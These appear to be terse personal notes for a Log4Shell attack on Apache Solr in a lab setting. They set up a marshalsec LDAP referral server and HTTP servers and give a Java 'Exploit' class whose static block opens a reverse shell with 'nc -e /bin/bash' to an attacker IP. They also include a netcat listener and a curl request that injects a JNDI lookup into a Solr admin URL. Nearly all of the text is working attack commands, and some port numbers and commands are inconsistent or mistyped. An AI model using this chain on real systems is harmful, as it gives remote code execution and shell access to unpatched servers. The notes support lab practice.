https://youtu.be/OJRqyCHheRE
https://github.com/mbechler/marshalsec 

#need http server
python3 -m http.server 8081

#need ldap referral server
cd /marshalsec
sudo apt install maven
mvn clean package -DskipTests


java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.109.253:8081/#Exploit"

#need to setup exploit and name Exploit.java
  public class Exploit {
      static {
          try {
              java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.109.253 8081");
          } catch (Exception e) {
              e.printStackTrace();
          }
      }
  }

#compile
javac Exploit.java

#more httpservers
python3 -m http-server 8082

#netcat
nc -lnvp 9999

#attack
curl 'http://10.10.109.254:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
